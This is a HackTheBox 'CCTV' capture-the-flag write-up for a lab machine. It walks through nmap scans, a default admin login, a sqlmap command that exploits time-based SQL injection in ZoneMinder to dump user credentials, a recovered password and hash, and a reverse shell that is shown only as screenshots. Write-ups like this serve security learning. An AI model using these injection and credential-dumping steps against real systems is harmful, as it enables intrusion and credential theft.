---
title: "CCTV"
date: 2026-03-08
draft: false
description: "HackTheBox CCTV writeup"
tags: ["hackthebox", "htb", "linux", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# CCTV

## Overview

- **OS:** Linux
- **IP:** 10.129.3.60
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

timebased sqli gave ssh creds, anbd then rce via public exploit.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
└─$ nmap cctv.htb -sU --min-rate=20000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 08:05 EDT
Nmap scan report for cctv.htb (10.129.3.60)
Host is up (0.12s latency).
Not shown: 994 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
1066/udp  closed fpo-fns
9370/udp  closed unknown
16545/udp closed unknown
17332/udp closed unknown
21320/udp closed unknown
34758/udp closed unknown

nmap cctv.htb -sCV -A -p- -Pn --min-rate=20000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 08:05 EDT
Warning: 10.129.3.60 giving up on port because retransmission cap hit (10).
Nmap scan report for cctv.htb (10.129.3.60)
Host is up (0.12s latency).
Not shown: 62846 closed tcp ports (reset), 2687 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   115.60 ms 10.10.14.1
2   116.15 ms cctv.htb (10.129.3.60)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.54 seconds

```

## Dirbusting

```

```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 569.png" >}}

the login page takes us here

{{< figure src="image 570.png" >}}

suprising a simple admin:admin gets us in

{{< figure src="image 571.png" >}}

{{< figure src="image 572.png" >}}

## Exploitation

{{< figure src="image 573.png" >}}

visting this forum

[https://forums.zoneminder.com/viewtopic.php?t=1029](https://forums.zoneminder.com/viewtopic.php?t=1029)

tells us the db structure so we are able to enumerate more efficiently now

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=6lkqf49jhdfdo1l4nplp9m9o5" \
-D zm -T Users -C Username,Password \
--where="Username='mark'" \
--dump --threads 10 --batch
```

{{< figure src="image 574.png" >}}

and the password we get is **opensesame**

{{< figure src="image 575.png" >}}

a bunch of ports running here

{{< figure src="image 576.png" >}}

seems to be running motion 4.7.1

```
grep -R "7999\|8888\|8765\|9081\|8554\|1935" /etc 2>/dev/null
grep -R "3306\|mysql" /etc 2>/dev/null
```

{{< figure src="image 577.png" >}}

and we have motioneye lets check its config and portforward the webportal

{{< figure src="image 578.png" >}}

we have admin username as admin

and password

989c5a8ee87a0e9521ec81a79187d162109282f0

lets follow this now

{{< figure src="image 579.png" >}}

after bypassing client side verif in the console we can 

{{< figure src="image 580.png" >}}

and this should give us our reverse shell

{{< figure src="image 581.png" >}}
